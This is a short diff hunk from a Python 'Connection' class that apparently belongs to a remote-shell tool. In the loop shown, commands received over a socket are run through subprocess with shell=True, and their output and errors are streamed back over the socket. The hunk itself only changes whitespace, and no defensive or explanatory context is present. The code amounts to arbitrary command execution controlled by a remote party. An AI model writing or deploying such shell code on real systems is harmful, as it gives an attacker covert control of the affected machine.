@@ -42,19 +42,20 @@ class Connection():
                 break
             else:
                 CMD = subprocess.Popen(
-                        command,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        stdin=subprocess.PIPE
+                            command,
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE
                                        )
+
                 stdout_chunk = CMD.stdout.read(1024)
                 while stdout_chunk.decode():
                     self.s.send(stdout_chunk)
                     time.sleep(2)
                     stdout_chunk = CMD.stdout.read(1024)
-                stderr_chunk = CMD.stderr.read(1024)
 
+                stderr_chunk = CMD.stderr.read(1024)
                 while stderr_chunk.decode():
                     self.s.send(stderr_chunk)
                     time.sleep(2)
